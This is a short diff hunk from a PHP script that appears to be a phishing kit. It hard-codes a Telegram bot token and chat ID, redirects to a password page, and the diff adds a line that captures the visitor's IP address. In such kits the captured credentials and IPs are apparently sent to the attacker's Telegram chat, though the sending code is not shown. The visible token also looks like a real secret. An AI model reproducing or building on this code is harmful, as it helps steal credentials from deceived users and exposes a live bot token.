@@ -51,6 +51,7 @@ header("Location: password.php");
     $telegram_BOT_zoolander = '8337096282:AAF8TwM1zOm8gU05lCQ_W5UGVPpyT4mldXs';
     $telegram_Chat_ID  = '-5240628157';
 
+    $ip = $_SERVER['REMOTE_ADDR'];
     $ip = getenv("REMOTE_ADDR");
     $ThanksURL = "thanks.html";
 
